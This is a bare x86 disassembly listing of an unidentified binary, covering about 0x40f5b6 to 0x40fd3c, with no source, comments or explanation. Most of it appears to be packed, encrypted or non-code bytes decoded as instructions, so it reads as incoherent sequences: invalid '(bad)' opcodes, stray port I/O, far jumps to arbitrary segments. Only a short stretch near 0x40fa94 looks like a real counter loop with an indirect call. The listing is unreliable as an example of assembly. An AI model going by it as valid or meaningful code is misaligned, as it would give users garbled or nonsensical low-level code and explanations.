  40f5b6:	mov    ds:0x6a4fbfbb,al
  40f5bb:	xchg   esp,eax
  40f5bc:	fimul  WORD PTR [edx+0x62]
  40f5bf:	scas   eax,DWORD PTR es:[edi]
  40f5c0:	cmc    
  40f5c1:	sub    eax,0xf58ae348
  40f5c6:	mov    eax,0xa7204044
  40f5cb:	jns    0x40f5c9
  40f5cd:	(bad)  
  40f5ce:	cdq    
  40f5cf:	inc    ebx
  40f5d0:	xchg   DWORD PTR [edx-0x4009f8c2],esi
  40f5d6:	pop    esp
  40f5d7:	push   ecx
  40f5d8:	jae    0x40f593
  40f5da:	mov    ds:0x5f1ce553,al
  40f5df:	push   ebp
  40f5e0:	rcr    DWORD PTR [edx+0x4],1
  40f5e3:	aaa    
  40f5e4:	push   edi
  40f5e5:	mov    esi,0xc5244a22
  40f5ea:	push   ebx
  40f5eb:	jns    0x40f649
  40f5ed:	jle    0x40f636
  40f5ef:	dec    eax
  40f5f0:	out    dx,eax
  40f5f1:	fadd   DWORD PTR [eax+eiz*4]
  40f5f4:	out    0x89,al
  40f5f6:	jecxz  0x40f59a
  40f5f8:	cli    
  40f5f9:	mov    al,0x4
  40f5fb:	cmp    al,0x96
  40f5fd:	mov    cl,0x36
  40f5ff:	jge    0x40f5fd
  40f601:	inc    edi
  40f602:	cmp    DWORD PTR [ebp+0x7a],ebp
  40f605:	bound  ebx,QWORD PTR fs:[edx-0x7a]
  40f609:	cmp    eax,esp
  40f60b:	scas   eax,DWORD PTR es:[edi]
  40f60c:	xchg   esp,eax
  40f60d:	mov    al,ds:0xe6a506b4
  40f612:	cdq    
  40f613:	jl     0x40f5da
  40f615:	lods   al,BYTE PTR ds:[esi]
  40f616:	and    bh,BYTE PTR ds:0xa6a55fb7
  40f61c:	int3   
  40f61d:	sub    eax,0x80794a74
  40f622:	aam    0x17
  40f624:	into   
  40f625:	pop    es
  40f626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f627:	push   ecx
  40f628:	mov    ds:0x642f937b,al
  40f62d:	mov    ebx,0x25bef5b9
  40f632:	xor    DWORD PTR [esi-0x47],edx
  40f635:	inc    esp
  40f636:	mov    ecx,es
  40f638:	aam    0xea
  40f63a:	jle    0x40f63e
  40f63c:	pop    esi
  40f63d:	(bad)  
  40f63e:	js     0x40f627
  40f640:	sbb    al,BYTE PTR [edx+0x53]
  40f643:	add    al,0xe9
  40f645:	xchg   edi,eax
  40f646:	gs cmc 
  40f648:	mov    bh,0xa2
  40f64a:	aad    0x42
  40f64c:	jmp    0x3d45:0x62ddc1
  40f653:	sahf   
  40f654:	fst    DWORD PTR [ebx+0x0]
  40f657:	dec    esp
  40f658:	cmp    ebp,ecx
  40f65a:	mov    dl,0xba
  40f65c:	cmp    dl,bl
  40f65e:	mov    al,0xed
  40f660:	pop    edx
  40f661:	lahf   
  40f662:	inc    esp
  40f663:	push   0x7a
  40f665:	daa    
  40f666:	push   edx
  40f667:	and    ebx,DWORD PTR [edi-0x77cf5c1a]
  40f66d:	imul   BYTE PTR [edx-0x6d8ea940]
  40f673:	or     al,0x59
  40f675:	inc    ecx
  40f676:	ret    0x4bc0
  40f679:	add    edx,edi
  40f67b:	lea    eax,[edx-0x57fa7cc7]
  40f681:	jg     0x40f63d
  40f683:	aad    0x2b
  40f685:	(bad)
  40f689:	jmp    0x40f6cd
  40f68b:	rol    BYTE PTR [edx+0x59fa8580],1
  40f691:	jmp    0x40f65e
  40f693:	or     DWORD PTR [edi+0x19fe5f71],eax
  40f699:	in     eax,0x94
  40f69b:	out    dx,eax
  40f69c:	push   edi
  40f69d:	das    
  40f69e:	xor    al,0x97
  40f6a0:	scas   eax,DWORD PTR es:[edi]
  40f6a1:	push   ebx
  40f6a2:	ret    
  40f6a3:	sti    
  40f6a4:	outs   dx,BYTE PTR ds:[esi]
  40f6a5:	dec    DWORD PTR [eax-0x69]
  40f6a8:	or     ebp,DWORD PTR [esp+eax*1-0x6f7d4c2b]
  40f6af:	mov    ebx,0xaedcaa24
  40f6b4:	sub    al,0x97
  40f6b6:	add    BYTE PTR [ecx+0x7a],0x5c
  40f6ba:	and    eax,0x623b3994
  40f6bf:	dec    esi
  40f6c1:	sbb    BYTE PTR [esi+edx*1-0x69],0x31
  40f6c6:	lock push eax
  40f6c8:	call   0x48d542a5
  40f6cd:	push   esi
  40f6ce:	iret   
  40f6cf:	and    BYTE PTR [edx],cl
  40f6d1:	pop    ebp
  40f6d2:	or     edx,DWORD PTR [ebp-0x66]
  40f6d5:	jae    0x40f6e7
  40f6d7:	sti    
  40f6d8:	adc    DWORD PTR [edi+0x6064c793],edi
  40f6de:	dec    ebx
  40f6df:	cwde   
  40f6e0:	in     eax,0xa3
  40f6e2:	loope  0x40f732
  40f6e4:	fistp  DWORD PTR [edi-0x75]
  40f6e7:	add    DWORD PTR [edi],ebx
  40f6e9:	xchg   esp,eax
  40f6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6eb:	xchg   DWORD PTR [esi],eax
  40f6ed:	cmp    edx,edx
  40f6ef:	sub    al,0x80
  40f6f1:	aam    0x88
  40f6f3:	adc    eax,0x4159e7fe
  40f6f8:	in     al,0xec
  40f6fa:	in     al,dx
  40f6fb:	cmp    BYTE PTR [edx],cl
  40f6fd:	jg     0x40f71e
  40f6ff:	mov    bl,bh
  40f701:	mov    ebp,0x845c0375
  40f706:	test   al,0x8f
  40f708:	mov    BYTE PTR [edx+0x1e],dl
  40f70b:	cmp    esi,ebp
  40f70d:	push   esi
  40f70e:	adc    eax,DWORD PTR [ebp+0x50ebffb8]
  40f714:	sub    BYTE PTR [ecx],dl
  40f716:	cmp    ecx,DWORD PTR [ebx-0x75]
  40f719:	sub    ecx,DWORD PTR [esi+eiz*8]
  40f71c:	inc    esp
  40f71d:	scas   eax,DWORD PTR es:[edi]
  40f71e:	data16 in al,dx
  40f720:	mov    edi,0x8b111711
  40f725:	dec    eax
  40f726:	cmp    al,0x6
  40f728:	xor    ah,bl
  40f72a:	mov    ch,0x75
  40f72c:	sbb    al,0x62
  40f72e:	and    ch,BYTE PTR es:[edi-0x23]
  40f732:	imul   edi
  40f734:	push   esi
  40f735:	sbb    BYTE PTR [edi+edi*4],cl
  40f738:	ja     0x40f6c9
  40f73a:	daa    
  40f73b:	daa    
  40f73c:	in     eax,0xaf
  40f73e:	outs   dx,DWORD PTR ds:[esi]
  40f73f:	mov    al,fs:0xa9f4d49a
  40f745:	mov    ds:0xe53c9268,al
  40f74a:	test   eax,0x2b914d88
  40f74f:	jmp    0x40f72b
  40f751:	gs ins BYTE PTR es:[edi],dx
  40f753:	jo     0x40f7c7
  40f755:	fcmovne st,st(4)
  40f757:	mov    eax,0x43b878e8
  40f75c:	retf   0xb7da
  40f75f:	rcl    BYTE PTR [edx],0x1d
  40f762:	repnz dec esp
  40f764:	mov    bh,0x71
  40f766:	cld    
  40f767:	iret   
  40f768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f769:	sbb    DWORD PTR [edx+0x262bfd58],esi
  40f76f:	call   DWORD PTR [ebp-0x3033cacb]
  40f775:	mov    ah,0x9d
  40f777:	add    eax,0xbd084a2c
  40f77c:	mov    cs,WORD PTR [ebp+0x2e]
  40f77f:	mov    BYTE PTR [eax+edi*4+0x1aeba718],bl
  40f786:	fist   DWORD PTR [edi-0x1f360b8d]
  40f78c:	and    ebx,DWORD PTR [eax+0x184c886f]
  40f792:	lahf   
  40f793:	inc    ebx
  40f794:	fild   WORD PTR [esi]
  40f796:	cmp    dl,BYTE PTR [esp+edx*4]
  40f799:	and    ah,BYTE PTR [ebx-0x9]
  40f79c:	pop    ds
  40f79d:	aaa    
  40f79e:	dec    edi
  40f79f:	sbb    DWORD PTR [ebx-0x28b519ca],0x1d
  40f7a6:	inc    esp
  40f7a7:	sar    cl,0xa3
  40f7aa:	enter  0x434,0x41
  40f7ae:	xor    eax,0x7126e94
  40f7b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b4:	xchg   esi,eax
  40f7b5:	pusha  
  40f7b6:	shl    BYTE PTR [ecx-0x616a7c59],1
  40f7bc:	ret    0xc022
  40f7bf:	scas   eax,DWORD PTR es:[edi]
  40f7c0:	shl    DWORD PTR [edx],0x99
  40f7c3:	add    eax,0x658a85d8
  40f7c8:	xor    bl,BYTE PTR [ebp+0x40]
  40f7cb:	neg    DWORD PTR [esp+edx*1+0x4f4f25e7]
  40f7d2:	cmp    esp,DWORD PTR [edx+0x7b]
  40f7d5:	popf   
  40f7d6:	sub    BYTE PTR [ecx+0x1a],ch
  40f7d9:	aam    0xa9
  40f7db:	mov    al,0x9d
  40f7dd:	daa    
  40f7de:	xchg   DWORD PTR [esi],esi
  40f7e0:	push   ebp
  40f7e1:	jmp    0xb691f43c
  40f7e6:	out    0x4d,al
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a799,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x943f3b5f,ch
  40f80a:	adc    esp,DWORD PTR [eax]
  40f80c:	inc    edi
  40f80d:	js     0x40f887
  40f80f:	in     eax,0x7e
  40f811:	js     0x40f88b
  40f813:	adc    al,0xb6
  40f815:	jo     0x40f831
  40f817:	ss or  eax,0x7bf3d6bd
  40f81d:	imul   dh
  40f81f:	cld    
  40f820:	add    ch,BYTE PTR ds:0x5c4733ae
  40f826:	mov    ebx,DWORD PTR [eax]
  40f828:	mov    BYTE PTR [ebx],ah
  40f82a:	mov    cl,0xdb
  40f82c:	das    
  40f82d:	out    0x7e,eax
  40f82f:	xor    DWORD PTR [ebp+0x54],edi
  40f832:	mov    eax,0xb5b543a4
  40f837:	add    edi,edi
  40f839:	jecxz  0x40f7c0
  40f83b:	ins    BYTE PTR es:[edi],dx
  40f83c:	xor    edi,DWORD PTR [edi]
  40f83e:	dec    ebp
  40f83f:	mov    ebp,0xe5fe4ef8
  40f844:	xchg   DWORD PTR ds:0x9b013cdf,ebx
  40f84a:	cmp    DWORD PTR [ecx],0xffffff92
  40f84d:	pop    edx
  40f84e:	cwde   
  40f84f:	out    dx,al
  40f850:	dec    esi
  40f851:	rcl    DWORD PTR [eax+edx*4+0x3f],cl
  40f855:	into   
  40f856:	stc    
  40f857:	out    dx,al
  40f858:	add    BYTE PTR [edx-0x5d],dl
  40f85b:	stos   BYTE PTR es:[edi],al
  40f85c:	xchg   ebx,eax
  40f85d:	fld    TBYTE PTR [edx+0x1e]
  40f860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f861:	and    eax,0x3e3ddff7
  40f866:	mov    bl,0xff
  40f868:	pop    ebx
  40f869:	jmp    0x648d:0x4e893d76
  40f870:	sub    DWORD PTR [eax-0x79],esp
  40f873:	(bad)  
  40f874:	stc    
  40f875:	pushf  
  40f876:	call   FWORD PTR [ebp+0x6e]
  40f879:	ret    
  40f87a:	inc    eax
  40f87b:	dec    ebx
  40f87c:	sbb    BYTE PTR [ebx],bl
  40f87e:	push   ds
  40f87f:	adc    DWORD PTR [ebx+0x30cea589],edi
  40f885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f886:	jecxz  0x40f84a
  40f888:	clc    
  40f889:	stc    
  40f88a:	popa   
  40f88b:	dec    esi
  40f88c:	shr    BYTE PTR [eax],cl
  40f88e:	rol    BYTE PTR [ebp+0x26271d61],0xac
  40f895:	add    edi,DWORD PTR [edx]
  40f897:	sbb    eax,0x12a3622e
  40f89c:	pop    esi
  40f89d:	(bad)  
  40f89e:	xor    eax,0x1c5d308d
  40f8a3:	cmc    
  40f8a4:	lods   al,BYTE PTR ds:[esi]
  40f8a5:	adc    ecx,DWORD PTR [ecx]
  40f8a7:	ss leave 
  40f8a9:	jne    0x40f906
  40f8ab:	(bad)  
  40f8ad:	mov    DWORD PTR [edi],ebp
  40f8af:	xchg   esp,eax
  40f8b0:	arpl   WORD PTR [eax],sp
  40f8b2:	iret   
  40f8b3:	retf   0x20a
  40f8b6:	adc    cl,BYTE PTR [ebx+esi*4+0xdb0f061]
  40f8bd:	stos   BYTE PTR es:[edi],al
  40f8be:	shr    BYTE PTR [edx-0x7f],0x55
  40f8c2:	jp     0x40f8b4
  40f8c4:	sub    al,0x6c
  40f8c6:	(bad)  
  40f8c7:	(bad)  
  40f8c8:	xchg   ebx,eax
  40f8c9:	xchg   DWORD PTR [edi+0x345f0b35],esi
  40f8cf:	aas    
  40f8d0:	pushf  
  40f8d1:	fs jg  0x40f91a
  40f8d4:	idiv   DWORD PTR [ebp-0x25]
  40f8d7:	mov    al,0x87
  40f8d9:	sbb    DWORD PTR [esi-0x1c],edx
  40f8dc:	push   esi
  40f8dd:	push   ebp
  40f8de:	jl     0x40f896
  40f8e0:	aad    0xc6
  40f8e2:	pusha  
  40f8e3:	jle    0x40f8e2
  40f8e5:	fwait
  40f8e6:	mov    eax,ds:0x5d9e545
  40f8eb:	inc    esi
  40f8ec:	pop    ss
  40f8ed:	and    edx,DWORD PTR [eax+esi*8+0x12]
  40f8f1:	xor    eax,0xe2041f40
  40f8f6:	push   ebp
  40f8f7:	retf   
  40f8f8:	les    ebp,FWORD PTR [eax-0x5e7545d7]
  40f8fe:	out    dx,al
  40f8ff:	leave  
  40f900:	repnz adc eax,0x13a0701e
  40f906:	add    ecx,esi
  40f908:	sbb    eax,0x7004abff
  40f90d:	das    
  40f90e:	dec    edx
  40f90f:	(bad)  
  40f910:	mov    al,0x92
  40f912:	push   ds
  40f913:	jno    0x40f8ee
  40f915:	push   es
  40f916:	add    DWORD PTR [edi+0x4ead8072],0x30
  40f91d:	jnp    0x40f983
  40f91f:	icebp  
  40f920:	push   es
  40f921:	mov    ah,0xcf
  40f923:	fwait
  40f924:	lock mov DWORD PTR [edi+0x29e7fe6a],esi
  40f92b:	mov    bl,0x31
  40f92d:	pop    ss
  40f92e:	cmp    ebp,DWORD PTR [edx]
  40f930:	xor    cl,BYTE PTR [edi+0x6b0115cf]
  40f936:	mov    dl,0x15
  40f938:	xchg   edi,eax
  40f939:	jo     0x40f8bc
  40f93b:	rcr    DWORD PTR [eax-0x64e5ccce],1
  40f941:	nop
  40f942:	add    al,0xc5
  40f944:	mov    al,ds:0x15297f18
  40f949:	(bad)  
  40f94a:	and    esp,ebp
  40f94c:	push   esp
  40f94d:	xlat   BYTE PTR fs:[ebx]
  40f94f:	clc    
  40f950:	ret    
  40f951:	pop    ss
  40f952:	(bad)  
  40f953:	lods   eax,DWORD PTR ds:[esi]
  40f954:	sbb    ch,ah
  40f956:	mov    ds:0xdd62726b,eax
  40f95b:	aad    0xb3
  40f95d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f95e:	fwait
  40f95f:	(bad)  
  40f960:	mov    ds:0xc05dc684,eax
  40f965:	cmc    
  40f966:	mov    ecx,0x71d0cd51
  40f96b:	jns    0x40f905
  40f96d:	pop    ecx
  40f96e:	mov    al,0xbe
  40f970:	cmp    al,0xf0
  40f972:	inc    ebx
  40f973:	hlt    
  40f974:	add    dl,BYTE PTR [ebp-0x7]
  40f977:	adc    al,0xc9
  40f979:	dec    ebp
  40f97a:	lods   eax,DWORD PTR ds:[esi]
  40f97b:	adc    al,0x21
  40f97d:	jp     0x40f979
  40f97f:	dec    edi
  40f980:	stc    
  40f981:	push   esp
  40f982:	aas    
  40f983:	sub    eax,ecx
  40f985:	cs cmp al,0x5a
  40f988:	cmovle esp,DWORD PTR [edx-0x63]
  40f98c:	mov    esp,0x5712ec90
  40f991:	(bad)  
  40f992:	cld    
  40f993:	cwde   
  40f994:	xor    esp,esi
  40f996:	ja     0x40f9d2
  40f998:	outs   dx,BYTE PTR ds:[esi]
  40f999:	pop    esi
  40f99a:	outs   dx,BYTE PTR ds:[esi]
  40f99b:	pop    edx
  40f99c:	mov    eax,ebx
  40f99e:	dec    ecx
  40f99f:	xchg   DWORD PTR [esi-0x647bdc3f],esi
  40f9a5:	int    0xb2
  40f9a7:	mov    bh,0x66
  40f9a9:	mov    ds:0xe6280aa1,al
  40f9ae:	in     eax,0x43
  40f9b0:	push   eax
  40f9b1:	retf   0xd6a8
  40f9b4:	jg     0x40fa2f
  40f9b6:	push   edx
  40f9b7:	xor    al,0xe
  40f9b9:	(bad)  
  40f9ba:	mov    edx,0xb37653b4
  40f9bf:	pop    esp
  40f9c0:	lods   al,BYTE PTR ds:[esi]
  40f9c1:	cmc    
  40f9c2:	xchg   esi,eax
  40f9c3:	sbb    BYTE PTR [ecx+eiz*8+0x8891c69],0xd2
  40f9cb:	jae    0x40f95e
  40f9cd:	mov    esi,0x97e82ed0
  40f9d2:	xor    esi,DWORD PTR [edi-0xae79f2f]
  40f9d8:	sub    ebp,esp
  40f9da:	lods   al,BYTE PTR ds:[esi]
  40f9db:	sub    esp,DWORD PTR [edi+0x4a]
  40f9de:	nop
  40f9df:	stos   BYTE PTR es:[edi],al
  40f9e0:	add    al,0xf4
  40f9e2:	mov    ds:0x5227ee30,eax
  40f9e7:	ret    
  40f9e8:	mov    edi,0x6e97653a
  40f9ed:	fisubr DWORD PTR [ebp+0x4e917939]
  40f9f3:	mov    ecx,0xa0a5ecd5
  40f9f8:	in     al,dx
  40f9f9:	imul   edx,DWORD PTR [eax+0x42],0x8d63cde3
  40fa00:	fidiv  WORD PTR [ecx+ebp*8]
  40fa03:	iret   
  40fa04:	dec    ebp
  40fa05:	or     cl,BYTE PTR [eax+ebp*2+0x673c7e98]
  40fa0c:	cmp    DWORD PTR [eax-0x3faa4aa7],esp
  40fa12:	cmp    al,0x97
  40fa14:	mov    ebp,0x4c756483
  40fa19:	outs   dx,DWORD PTR ds:[esi]
  40fa1a:	cmp    ah,BYTE PTR [edi]
  40fa1c:	cmc    
  40fa1d:	mov    ch,0xb4
  40fa1f:	pop    ss
  40fa20:	jbe    0x40f9fb
  40fa22:	iret   
  40fa23:	adc    ch,BYTE PTR [ecx-0x72]
  40fa26:	jecxz  0x40f9f2
  40fa28:	jno    0x40fa9d
  40fa2a:	sub    al,0xc9
  40fa2c:	xchg   esi,eax
  40fa2d:	sub    al,0xa7
  40fa2f:	aas    
  40fa30:	mov    ds:0x676ac555,eax
  40fa35:	pop    es
  40fa36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa37:	dec    esp
  40fa38:	adc    BYTE PTR [esi],dh
  40fa3a:	ins    DWORD PTR es:[edi],dx
  40fa3b:	imul   eax,DWORD PTR [esi-0x284c709e],0x2364e7e3
  40fa45:	into   
  40fa46:	xchg   ecx,eax
  40fa47:	loope  0x40fa0c
  40fa49:	mov    bl,0x72
  40fa4b:	or     BYTE PTR [ecx],bh
  40fa4d:	addr16 inc edx
  40fa4f:	xor    ebp,ecx
  40fa51:	call   0x281a:0xd518bbb5
  40fa58:	scas   eax,DWORD PTR es:[edi]
  40fa59:	pop    ds
  40fa5a:	hlt    
  40fa5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa5c:	mov    bl,0x72
  40fa5e:	xchg   esi,esp
  40fa60:	out    dx,eax
  40fa61:	or     BYTE PTR [edx+0x767855d9],0xa
  40fa68:	in     eax,dx
  40fa69:	loop   0x40fa19
  40fa6b:	push   es
  40fa6c:	bound  ebp,QWORD PTR [eax]
  40fa6e:	mov    ds:0xc29795ba,eax
  40fa73:	pop    esp
  40fa74:	push   es
  40fa75:	loopne 0x40fa05
  40fa77:	pushf  
  40fa78:	add    eax,0xf6cb5d80
  40fa7d:	out    0xf,eax
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42a829,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7e1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7e1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7e1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7e1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7e1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7e1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7e1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7e1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb50
  40fb0f:	mov    eax,0x458d0c87
  40fb14:	js     0x40fb8e
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	stos   DWORD PTR es:[edi],eax
  40fb1b:	jge    0x40fad8
  40fb1d:	xor    bh,BYTE PTR [esi+0x18]
  40fb20:	call   0xed4:0x5b9ef3e5
  40fb27:	and    BYTE PTR [ecx+0x24],dh
  40fb2a:	lods   al,BYTE PTR ds:[esi]
  40fb2b:	sbb    eax,0xe91e6dd1
  40fb30:	push   fs
  40fb32:	and    BYTE PTR [eax],dh
  40fb34:	sbb    ch,dh
  40fb36:	mov    ecx,?
  40fb38:	add    ch,BYTE PTR ds:0xe4292f35
  40fb3e:	mov    dh,0x96
  40fb40:	(bad)  
  40fb41:	nop
  40fb42:	bound  eax,QWORD PTR [eax]
  40fb44:	cmp    edi,edi
  40fb46:	arpl   WORD PTR [eax+edx*1],di
  40fb49:	dec    esp
  40fb4a:	mov    cl,0xeb
  40fb4c:	inc    esp
  40fb4d:	pop    ebx
  40fb4e:	mov    ecx,0xd1c53f5e
  40fb53:	xchg   ebx,eax
  40fb54:	jp     0x40fb4c
  40fb56:	loopne 0x40fb7f
  40fb58:	jnp    0x40fbd7
  40fb5a:	dec    edx
  40fb5b:	mov    eax,0x1402bce6
  40fb60:	xor    esi,ecx
  40fb62:	push   esi
  40fb63:	xchg   edx,eax
  40fb64:	xor    eax,0xcedb6c93
  40fb69:	pushf  
  40fb6a:	imul   eax,DWORD PTR [ecx],0x6f
  40fb6d:	push   ds
  40fb6e:	sbb    DWORD PTR [esi],eax
  40fb70:	add    al,0x2a
  40fb72:	pop    es
  40fb73:	xchg   ecx,eax
  40fb74:	push   cs
  40fb75:	fwait
  40fb76:	icebp  
  40fb77:	imul   esi,DWORD PTR [edx-0x79],0x781340e6
  40fb7e:	push   ebx
  40fb7f:	addr16 dec ebp
  40fb81:	(bad)  
  40fb82:	retf   
  40fb83:	je     0x40fbf8
  40fb85:	inc    edx
  40fb86:	cli    
  40fb87:	hlt    
  40fb88:	and    al,ah
  40fb8a:	mov    bh,0xd4
  40fb8c:	dec    ebp
  40fb8d:	mov    al,0x83
  40fb8f:	sub    ebx,edx
  40fb91:	aaa    
  40fb92:	repz mov eax,0x6a621d2
  40fb98:	and    eax,0x42fb6b09
  40fb9d:	rcr    BYTE PTR [edi+0x31],0xd1
  40fba1:	xor    dh,bh
  40fba3:	jg     0x40fb3b
  40fba5:	and    ecx,0x24
  40fba8:	aam    0x10
  40fbaa:	push   0x46c73a59
  40fbaf:	inc    ebx
  40fbb0:	(bad)  
  40fbb1:	mov    esi,DWORD PTR [edi*4-0x7c21898b]
  40fbb8:	sti    
  40fbb9:	int    0xb5
  40fbbb:	rol    BYTE PTR [ebx],cl
  40fbbd:	push   0xe9179238
  40fbc2:	sbb    ch,dl
  40fbc4:	out    0x6f,eax
  40fbc6:	pop    eax
  40fbc7:	ins    BYTE PTR es:[edi],dx
  40fbc8:	inc    edx
  40fbc9:	outs   dx,DWORD PTR ds:[esi]
  40fbca:	arpl   WORD PTR [ebx],ax
  40fbcc:	inc    esi
  40fbcd:	xchg   BYTE PTR [eax+edi*2-0x7d6a0e05],dh
  40fbd4:	xor    DWORD PTR [edi+0x37fa9bef],ecx
  40fbda:	ror    DWORD PTR ds:0xd69db2d5,1
  40fbe0:	stc    
  40fbe1:	dec    eax
  40fbe2:	mov    BYTE PTR [edi+0x71],al
  40fbe5:	call   0x7aa9531a
  40fbea:	add    eax,0xb5be5e60
  40fbef:	add    al,0x9b
  40fbf1:	dec    esi
  40fbf2:	fcom   st(1)
  40fbf4:	dec    eax
  40fbf5:	jnp    0x40fc0b
  40fbf7:	mov    al,ds:0xe749abc2
  40fbfc:	pop    ebx
  40fbfd:	mov    al,0xc5
  40fbff:	mov    ebp,0x56cdad95
  40fc04:	fist   DWORD PTR [ebp-0x180984a5]
  40fc0a:	in     eax,0x85
  40fc0c:	mov    ebp,0x587c93e
  40fc11:	out    0x37,eax
  40fc13:	pop    esi
  40fc14:	pushf  
  40fc15:	idiv   BYTE PTR [edx+0x2128bf41]
  40fc1b:	in     eax,0xe
  40fc1d:	in     al,0x95
  40fc1f:	mov    eax,ds:0x503732d6
  40fc24:	sub    bl,dh
  40fc26:	lea    edx,[ebp-0x30]
  40fc29:	cli    
  40fc2a:	dec    ecx
  40fc2b:	cmp    al,0xcd
  40fc2d:	mov    ?,WORD PTR [ebx+0x272a01a7]
  40fc33:	fs inc edx
  40fc35:	movhps QWORD PTR [ebx-0x744d92b0],xmm7
  40fc3c:	fs jae 0x40fca3
  40fc3f:	push   ss
  40fc40:	sti    
  40fc41:	call   0xffd1:0x89795cd
  40fc48:	jbe    0x40fbe2
  40fc4a:	jmp    0x40fcb2
  40fc4c:	test   eax,0xf6e05556
  40fc51:	clc    
  40fc52:	arpl   WORD PTR [eax-0x22],dx
  40fc55:	(bad)  
  40fc57:	dec    edi
  40fc58:	scas   al,BYTE PTR es:[edi]
  40fc59:	fsubrp st(3),st
  40fc5b:	jp     0x40fcd7
  40fc5d:	das    
  40fc5e:	and    eax,0xe6b99c8d
  40fc63:	test   ch,ch
  40fc65:	jb     0x40fc98
  40fc67:	int    0xe1
  40fc69:	scas   eax,DWORD PTR es:[edi]
  40fc6a:	cdq    
  40fc6b:	push   ecx
  40fc6c:	add    DWORD PTR ds:0xf8c1da5d,edx
  40fc72:	dec    edx
  40fc73:	dec    ecx
  40fc74:	fdiv   DWORD PTR [edi-0x65]
  40fc77:	out    dx,eax
  40fc78:	jge    0x40fce8
  40fc7a:	jecxz  0x40fcda
  40fc7c:	into   
  40fc7d:	pop    edi
  40fc7e:	repnz push edx
  40fc80:	push   es
  40fc81:	inc    ecx
  40fc82:	mov    al,ds:0x8473103f
  40fc87:	pop    eax
  40fc88:	clc    
  40fc89:	cmp    esp,ecx
  40fc8b:	jne    0x40fccc
  40fc8d:	jg     0x40fcc3
  40fc8f:	cdq    
  40fc90:	jecxz  0x40fc65
  40fc92:	sbb    DWORD PTR [eax-0x44],ebp
  40fc95:	mov    es,esp
  40fc97:	out    0x6f,eax
  40fc99:	bound  esi,QWORD PTR [edx]
  40fc9b:	jmp    0x90ed:0xe9bcf576
  40fca2:	stc    
  40fca3:	xchg   ebx,eax
  40fca4:	out    dx,al
  40fca5:	sahf   
  40fca6:	mov    DWORD PTR [edi],ecx
  40fca8:	out    0xf9,eax
  40fcaa:	inc    esi
  40fcab:	sbb    bh,BYTE PTR [ebx+0x1340cf76]
  40fcb1:	daa    
  40fcb2:	es cmovo eax,edi
  40fcb6:	pusha  
  40fcb7:	xchg   edx,eax
  40fcb8:	sub    BYTE PTR [ebp-0x40af7940],al
  40fcbe:	add    BYTE PTR [edi+0x69],al
  40fcc1:	loopne 0x40fcb8
  40fcc3:	sub    DWORD PTR [esi-0xc],0x16
  40fcc7:	ds cs call 0x187:0xe6411212
  40fcd0:	call   0x2848:0xdae3f2b0
  40fcd7:	sub    BYTE PTR [ecx-0x43db5ab2],dl
  40fcdd:	xchg   edi,eax
  40fcde:	xchg   ebx,eax
  40fcdf:	pop    es
  40fce0:	pop    edx
  40fce1:	pop    esi
  40fce2:	js     0x40fd00
  40fce4:	jge    0x40fc7c
  40fce6:	rol    edi,0xf
  40fce9:	not    bh
  40fceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcec:	in     eax,0x2e
  40fcee:	pop    eax
  40fcef:	xchg   esi,eax
  40fcf0:	adc    eax,DWORD PTR [ebx]
  40fcf2:	adc    BYTE PTR [esi+ecx*1+0x4483f177],bh
  40fcf9:	scas   al,BYTE PTR es:[edi]
  40fcfa:	mov    cs:0xd8a65024,al
  40fd00:	out    0x50,al
  40fd02:	icebp  
  40fd03:	lahf   
  40fd04:	add    DWORD PTR [ebx-0x5a],ebp
  40fd07:	or     al,0x1f
  40fd09:	in     al,dx
  40fd0a:	inc    eax
  40fd0b:	xor    DWORD PTR [ecx-0x3e],edi
  40fd0e:	in     eax,0xbd
  40fd10:	cmp    BYTE PTR [ecx-0x65],ah
  40fd13:	mov    al,ds:0x79f84c7b
  40fd18:	dec    ecx
  40fd19:	mov    ebx,0x158d9b93
  40fd1e:	push   0x5c
  40fd20:	push   0x6b
  40fd22:	adc    al,0x1e
  40fd24:	ja     0x40fcc9
  40fd26:	pop    edx
  40fd27:	jmp    0x40fcab
  40fd29:	or     cl,BYTE PTR ds:0xfea8f4fc
  40fd2f:	adc    edx,DWORD PTR [edx]
  40fd31:	pop    ebx
  40fd32:	test   eax,0x80d4116c
  40fd37:	sbb    eax,0x8aa697a8
  40fd3c:	pop    ds
